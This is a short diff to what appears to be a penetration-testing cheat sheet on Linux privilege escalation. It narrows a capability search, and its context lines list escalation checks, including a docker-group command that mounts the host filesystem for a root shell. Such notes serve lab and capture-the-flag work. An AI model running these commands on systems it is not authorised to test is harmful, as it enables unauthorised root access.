@@ -398,7 +398,7 @@ LINUX PRIVESC (after user shell):
   • sudo -l: Look for specific commands with shell escape
   • Kernel: uname -r → linux-exploit-suggester
   • Cron: cat /etc/crontab, pspy64 for hidden crons
-  • Capabilities: getcap -r / 2>/dev/null → cap_setuid = root
+  • Capabilities: getcap -r /usr /bin /sbin 2>/dev/null → cap_setuid = root
   • Docker group: docker run -v /:/host -it alpine chroot /host sh
 
 WINDOWS PRIVESC:
